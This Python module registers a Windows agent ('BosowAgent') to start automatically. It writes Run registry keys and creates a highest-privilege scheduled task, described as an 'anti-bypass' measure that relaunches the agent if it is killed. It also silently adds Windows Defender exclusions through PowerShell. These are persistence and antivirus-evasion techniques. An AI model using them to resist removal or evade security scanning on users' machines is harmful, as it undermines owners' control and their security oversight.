"""Windows startup registration via registry and Task Scheduler."""
from __future__ import annotations

import os
import subprocess
import sys
import logging

from agent import config

logger = logging.getLogger(__name__)


def get_exe_path() -> str:
    """Return the path to the running executable (PyInstaller frozen or .py)."""
    if getattr(sys, 'frozen', False):
        return sys.executable
    # Development mode – resolve to pythonw.exe or python.exe
    return sys.executable


def register_registry(exe_path: str | None = None) -> bool:
    """Add BosowAgent to HKEY_LOCAL_MACHINE\...\Run (requires admin)."""
    try:
        import winreg
    except ImportError:
        logger.warning('winreg not available – registry startup not registered')
        return False

    exe = exe_path or get_exe_path()
    key_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            key_path,
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, 'BosowAgent', 0, winreg.REG_SZ, f'"{exe}"')
        winreg.CloseKey(key)
        logger.info('Registered BosowAgent in HKLM Run (exe=%s)', exe)
        return True
    except PermissionError:
        logger.warning('No admin rights for HKLM Run – trying HKCU')
        return _register_hkcu(exe)
    except FileNotFoundError:
        logger.warning('Run key not found – trying HKCU')
        return _register_hkcu(exe)
    except Exception as e:
        logger.error('Failed to register startup in registry: %s', e)
        return False


def _register_hkcu(exe: str) -> bool:
    """Fall back to HKEY_CURRENT_USER (no admin required)."""
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, 'BosowAgent', 0, winreg.REG_SZ, f'"{exe}"')
        winreg.CloseKey(key)
        logger.info('Registered BosowAgent in HKCU Run (exe=%s)', exe)
        return True
    except Exception as e:
        logger.error('Failed to register startup in HKCU: %s', e)
        return False


def unregister_startup() -> bool:
    """Remove BosowAgent from both HKLM and HKCU Run keys."""
    try:
        import winreg
    except ImportError:
        return False

    for hive in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
        try:
            key = winreg.OpenKey(
                hive,
                r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                0,
                winreg.KEY_SET_VALUE,
            )
            winreg.DeleteValue(key, 'BosowAgent')
            winreg.CloseKey(key)
            logger.info('Removed BosowAgent from %s Run', hive)
        except FileNotFoundError:
            pass
        except Exception as e:
            logger.debug('Failed to remove from %s: %s', hive, e)
    return True


def register_task_scheduler(exe_path: str | None = None) -> bool:
    """Create a Windows Task Scheduler task to relaunch the agent on startup.

    This is the anti-bypass layer: if the agent is killed, Task Scheduler
    restarts it automatically.
    """
    exe = exe_path or get_exe_path()
    task_name = 'BosowAgent_AutoStart'

    # Build schtasks command
    cmd = [
        'schtasks', '/Create',
        '/TN', task_name,
        '/TR', f'"{exe}"',
        '/SC', 'ONLOGON',
        '/RL', 'HIGHEST',
        '/F',  # force overwrite
    ]

    try:
        from agent.utils.proc import NO_WINDOW
        result = subprocess.run(
            cmd,
            capture_output=True,
            timeout=30,
            creationflags=NO_WINDOW,
        )
        if result.returncode == 0:
            logger.info('Task Scheduler task "%s" created', task_name)
            return True
        else:
            stderr = result.stderr.decode(errors='replace').strip()
            logger.warning('schtasks failed (rc=%d): %s', result.returncode, stderr)
            return False
    except FileNotFoundError:
        logger.warning('schtasks.exe not found – Task Scheduler registration skipped')
        return False
    except subprocess.TimeoutExpired:
        logger.warning('schtasks timed out')
        return False
    except Exception as e:
        logger.error('Task Scheduler registration failed: %s', e)
        return False


def unregister_task_scheduler() -> bool:
    """Remove the BosowAgent Task Scheduler task."""
    task_name = 'BosowAgent_AutoStart'
    try:
        from agent.utils.proc import NO_WINDOW
        result = subprocess.run(
            ['schtasks', '/Delete', '/TN', task_name, '/F'],
            capture_output=True,
            timeout=15,
            creationflags=NO_WINDOW,
        )
        if result.returncode == 0:
            logger.info('Task Scheduler task "%s" removed', task_name)
            return True
        return False
    except Exception as e:
        logger.debug('Task Scheduler removal failed: %s', e)
        return False


def add_defender_exclusions() -> bool:
    """Add Windows Defender exclusions for AGENT_DIR and the running exe.

    Non-fatal — logs warnings on failure. Skips if already applied for the
    current exe path (sentinel stored in AGENT_DIR/defender_excluded.flag).
    Re-runs automatically after an update when the exe path changes.
    """
    if sys.platform != 'win32':
        return False

    exe = get_exe_path()
    sentinel = config.AGENT_DIR / 'defender_excluded.flag'

    if sentinel.exists():
        try:
            if sentinel.read_text(encoding='utf-8').strip() == exe:
                return True  # already applied for this exe
        except Exception:
            pass

    agent_dir = str(config.AGENT_DIR)
    try:
        script = (
            f'Add-MpPreference -ExclusionPath "{agent_dir}" -ErrorAction SilentlyContinue; '
            f'Add-MpPreference -ExclusionProcess "{exe}" -ErrorAction SilentlyContinue'
        )
        from agent.utils.proc import NO_WINDOW
        result = subprocess.run(
            ['powershell', '-NonInteractive', '-NoProfile', '-Command', script],
            capture_output=True,
            timeout=30,
            creationflags=NO_WINDOW,
        )
        if result.returncode == 0:
            try:
                sentinel.write_text(exe, encoding='utf-8')
            except Exception:
                pass
            logger.info('Defender exclusions added: path=%s, process=%s', agent_dir, exe)
            return True
        stderr = result.stderr.decode(errors='replace').strip()
        logger.warning('Defender exclusion failed (rc=%d): %s', result.returncode, stderr)
        return False
    except subprocess.TimeoutExpired:
        logger.warning('Defender exclusion timed out')
        return False
    except Exception as e:
        logger.warning('Defender exclusion error: %s', e)
        return False


def register_all() -> None:
    """Register agent for startup in both registry and Task Scheduler."""
    exe = get_exe_path()
    reg_ok = register_registry(exe)
    if not reg_ok:
        logger.warning('Registry registration failed – Task Scheduler fallback used')
    ts_ok = register_task_scheduler(exe)
    if not ts_ok:
        logger.warning('Task Scheduler registration failed')


def is_registered() -> bool:
    """Check if agent is registered in HKCU Run."""
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
            0,
            winreg.KEY_READ,
        )
        value, _ = winreg.QueryValueEx(key, 'BosowAgent')
        winreg.CloseKey(key)
        return bool(value)
    except FileNotFoundError:
        return False
    except Exception:
        return False